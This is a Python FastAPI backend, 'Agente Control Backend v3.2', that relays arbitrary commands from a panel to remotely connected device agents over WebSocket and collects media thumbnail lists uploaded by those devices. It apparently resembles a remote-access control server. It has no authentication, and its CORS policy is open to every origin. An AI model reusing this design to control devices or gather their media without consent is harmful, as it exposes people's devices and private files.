import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List

# --- INICIALIZACIÓN DE LA APLICACIÓN ---
app = FastAPI(title="Agente Control Backend v3.2")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: dict[str, dict] = {}
device_thumbnails_cache: dict[str, list] = {}


# --- MODELOS DE DATOS (RELLENOS CON 'pass') ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str
    # No necesitamos más código aquí, pero pydantic lo manejará.

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str
    # No necesitamos más código aquí.

# --- ENDPOINTS (RUTAS DE LA API) ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        name_to_print = connected_agents.get(device_id, {}).get("name", f"ID: {device_id}")
        print(f"[DESCONEXIÓN] Agente desconectado: '{name_to_print}'")
        if device_id in connected_agents: del connected_agents[device_id]
        if device_id in device_thumbnails_cache: del device_thumbnails_cache[device_id]


@app.get("/api/get-agents", response_model=List[dict])
async def get_agents():
    if not connected_agents:
        return []
    agent_list = [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]
    print(f"Panel solicitó la lista. Agentes conectados: {len(agent_list)}")
    return agent_list


@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    target_id = command.target_id
    if target_id not in connected_agents:
        return {"status": "error", "message": "Agente no encontrado o no conectado."}
    try:
        agent_socket = connected_agents[target_id]["ws"]
        await agent_socket.send_text(command.json())
        print(f"Comando '{command.action}' enviado a '{connected_agents[target_id]['name']}'")
        return {"status": "success", "message": "Comando enviado."}
    except Exception as e:
        print(f"[ERROR] Fallo al enviar comando a {target_id}: {e}")
        return {"status": "error", "message": "Fallo de comunicación con el agente."}


@app.post("/api/submit_media_list/{device_id}")
async def submit_media_list(device_id: str, thumbnails: List[Thumbnail]):
    if device_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}
    print(f"Recibidas {len(thumbnails)} miniaturas del agente '{connected_agents[device_id]['name']}'")
    device_thumbnails_cache[device_id] = [thumb.dict() for thumb in thumbnails]
    return {"status": "success"}


@app.get("/api/get_media_list/{device_id}", response_model=List[dict])
async def get_media_list(device_id: str):
    print(f"Panel pide la lista de medios para el agente con ID: {device_id[:8]}...")
    return device_thumbnails_cache.get(device_id, [])
